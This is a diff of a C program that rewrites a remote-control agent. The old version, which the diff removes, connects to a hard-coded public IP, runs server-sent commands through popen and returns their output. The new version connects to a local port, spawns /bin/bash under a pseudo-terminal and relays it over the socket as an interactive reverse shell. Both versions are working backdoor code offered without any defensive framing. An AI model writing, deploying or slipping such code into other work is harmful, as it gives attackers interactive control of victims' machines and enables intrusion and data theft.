@@ -2,61 +2,109 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 #include <arpa/inet.h>
-#include <string.h>
+#include <pty.h>
+#include <sys/wait.h>
 
-#define PORT 8080
 #define BUFFER_SIZE 1024
 
-int main() {
-    int sock = 0;
-    struct sockaddr_in serv_addr;
-    char *message = "Agent connected!";
-    char buffer[BUFFER_SIZE] = {0};
-    char output[4096] = "";
-    char buffer2[256];
-    
+int main(int argc, char *argv[]) {
+    int sock;
+    struct sockaddr_in server_addr;
+    char *server_ip;
+    int server_port;
+    int master_fd;
+    pid_t pid;
+    char buffer[BUFFER_SIZE];
+    fd_set read_fds;
+    int max_fd;
+
+    server_ip = "127.0.0.1";
+    server_port = 9001;
+
     // Create socket
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-        printf("Socket creation error\n");
-        return -1;
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
     }
+
+    // Setup server address structure
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
     
-    // Setup server address
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(PORT);
-    
-    // Convert IPv4 address from text to binary
-    if (inet_pton(AF_INET, "44.202.210.234", &serv_addr.sin_addr) <= 0) {
-        printf("Invalid address\n");
-        return -1;
+    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
+        perror("Invalid address");
+        close(sock);
+        exit(EXIT_FAILURE);
     }
-    
+
     // Connect to server
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-        printf("Connection failed\n");
-        return -1;
+    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Connection failed");
+        close(sock);
+        exit(EXIT_FAILURE);
     }
+
+    // Create a pseudo-terminal
+    pid = forkpty(&master_fd, NULL, NULL, NULL);
     
-    // Send message to server
-    send(sock, message, strlen(message), 0);
-    printf("Sent to server: %s\n", message);
-    
-    // Read response from server
-    while (1)
-    {
-        read(sock, buffer, BUFFER_SIZE);
-        FILE *fp = popen(buffer, "r");
-        while (fgets(buffer2, sizeof(buffer2), fp) != NULL) {
-            strcat(output, buffer2);
-        }   
-    
-        pclose(fp);
-        send(sock, output, strlen(output), 0);
+    if (pid < 0) {
+        perror("forkpty failed");
+        close(sock);
+        exit(EXIT_FAILURE);
     }
-    
-    // Close connection
+
+    if (pid == 0) {
+        // Child process - execute shell
+        char *args[] = {"/bin/bash", NULL};
+        execve("/bin/bash", args, NULL);
+        
+        // If execve fails
+        perror("execve failed");
+        exit(EXIT_FAILURE);
+    }
+
+    // Parent process - relay data between socket and PTY
+    max_fd = (sock > master_fd ? sock : master_fd) + 1;
+
+    while (1) {
+        FD_ZERO(&read_fds);
+        FD_SET(sock, &read_fds);
+        FD_SET(master_fd, &read_fds);
+
+        if (select(max_fd, &read_fds, NULL, NULL, NULL) < 0) {
+            perror("select failed");
+            break;
+        }
+
+        // Data from server -> PTY (shell input)
+        if (FD_ISSET(sock, &read_fds)) {
+            ssize_t n = read(sock, buffer, BUFFER_SIZE);
+            if (n <= 0) {
+                break;  // Server disconnected
+            }
+            write(master_fd, buffer, n);
+        }
+
+        // Data from PTY -> server (shell output)
+        if (FD_ISSET(master_fd, &read_fds)) {
+            ssize_t n = read(master_fd, buffer, BUFFER_SIZE);
+            if (n <= 0) {
+                break;  // Shell exited
+            }
+            write(sock, buffer, n);
+        }
+    }
+
+    // Cleanup
+    close(master_fd);
     close(sock);
-    
+    kill(pid, SIGTERM);
+    waitpid(pid, NULL, 0);
+
     return 0;
 }
